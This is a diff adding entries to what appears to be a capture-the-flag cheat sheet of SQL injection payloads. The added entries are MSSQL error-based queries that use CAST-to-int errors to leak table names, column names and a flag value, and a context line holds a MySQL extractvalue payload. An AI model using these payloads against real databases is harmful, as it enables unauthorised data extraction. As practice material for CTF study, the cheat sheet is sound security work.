@@ -402,7 +402,27 @@ CAST((
 ) AS INT)
 ```
 
+```sql
+CAST((SELECT name FROM target.sys.tables WHERE name LIKE '%flag%';) as int)
+```
 
+
+```sql
+CAST((
+  SELECT name 
+  FROM exercise.sys.columns 
+  WHERE object_id = OBJECT_ID('target.dbo.flags')
+  ORDER BY name
+  OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY
+) AS INT)
+```
+
+```sql
+CAST((
+  SELECT TOP 1 flag 
+  FROM target.dbo.flags
+) AS INT)
+```
 
 Errorbase
 MySQL = extractvalue('',concat('>',version()))
